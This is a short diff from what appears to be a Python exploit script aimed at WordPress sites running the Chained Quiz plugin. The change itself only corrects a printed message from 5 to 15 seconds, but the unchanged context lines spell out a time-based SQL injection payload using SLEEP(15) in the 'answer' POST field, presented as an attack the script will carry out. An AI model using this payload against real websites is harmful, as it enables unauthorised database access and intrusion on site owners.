@@ -165,7 +165,7 @@ while exit != "y":
             print ('I am going to exploit the wordpress website with the chained quiz plugin.')
             print ('The variable answer in the post request can be subject of time-based sql injection. \n')
             print ('I am going to inject the function SLEEP(15), that is a mySQL function.')
-            print ('This means that if I get the answer after 5 seconds the underlying database is a mySQL database.')
+            print ('This means that if I get the answer after 15 seconds the underlying database is a mySQL database.')
 
             postdata = {
                     "answer" : '1) AND (SELECT 8561 FROM (SELECT(SLEEP(15)))UzqU) AND (1071=1071',
